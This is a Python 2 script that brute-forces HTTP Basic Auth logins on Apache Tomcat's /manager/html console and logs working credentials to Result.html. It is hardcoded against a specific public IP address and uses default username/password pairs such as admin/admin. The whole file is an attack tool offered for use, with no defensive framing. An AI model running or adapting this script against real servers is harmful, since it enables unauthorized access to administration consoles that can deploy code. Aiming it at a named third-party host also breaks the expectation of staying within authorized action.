#!/usr/bin/env python  
# -*- coding: utf-8 -*-  

 
import time, httplib, base64

import re
from collections import deque
 
 
class Tomcatbrute():
        def __init__(self,server,port,path,user,password):

                self.host = str(server)
                self.port = str(port)
                self.path = str(path)
                self.user = str(user)
                self.password = str(password)
                self.userAgent = "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0"
 
         
        def writeresult(self,record):
                fp = open('Result.html','a+')
                fp.writelines(record+'')
                fp.close()
         
        def run(self):

                auth = base64.b64encode('%s:%s' % (self.user, self.password)).replace('\n', '')

 
                try:
                        h = httplib.HTTP(self.host,self.port)
                        h.putrequest('GET', self.path)
 
                        h.putheader('Host', self.host+':'+self.port)
                        h.putheader('User-agent', self.userAgent)
                        h.putheader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                        h.putheader('Accept-Language','en-us')
                        h.putheader('Accept-Encoding','gzip, deflate')
                         
                         
                        h.putheader('Authorization', 'Basic %s' %auth)

                        h.endheaders()
                         
                        statuscode, statusmessage, headers = h.getreply()

                        print headers['Server']
 
                        if (re.findall(r'Coyote',headers['Server'])):
                                if statuscode==200:
                                        print headers['Server']
                                        print "\t\n[OK]Username:",self.user,"Password:",self.password,"\n" 
                                        self.writeresult(self.host+":"+self.user+":"+self.password+"\n")
                                else:
                                        print "\t\nThis is not Tomcat\n" 
                        else:
                                pass
                                #print "\t\n[X]Wrong username or password!\n"
                except :
                        #print "An error occurred:", msg
                        pass
def timer():
    now = time.localtime(time.time())
    return time.asctime(now)
 
 
 
if __name__ == '__main__':

  
        path = '/manager/html'
         
        WEAK_USERNAME = ['admin']
        WEAK_PASSWORD = ['admin']
        #WEAK_USERNAME = ['tomcat','user']
        #WEAK_PASSWORD = ['tomcat','user']
        accounts =deque()   #list数组
         
        for username in WEAK_USERNAME:
                for password in WEAK_PASSWORD:
                        accounts.append((username,password))
         
        #print len(accounts)
        #server = sys.argv[1]
         
         
         

        ip = [ '113.105.74.144']
        port='80'
        for server in ip:
                print "[+] Server:",server
                print "[+] Port:",port
                print "[+] Users Loaded:",len(WEAK_USERNAME)
                print "[+] Words Loaded:",len(WEAK_PASSWORD)
                print "[+] Started",timer(),"\n"
                 
                for I in range(len(accounts)):
                        work = Tomcatbrute(server,port,path,accounts[I][0],accounts[I][1])
                        work.run()

                print "\n[-] Done -",timer(),"\n"


# 
# class a():
#     def __init__(self):
#         pass
# t=a()
# print t
# d=a
# print d
# print isinstance(t, a)
# print type(t).__instancecheck__(t)
# print type(d)
# print str(type(t))=='<type \'instance\'>'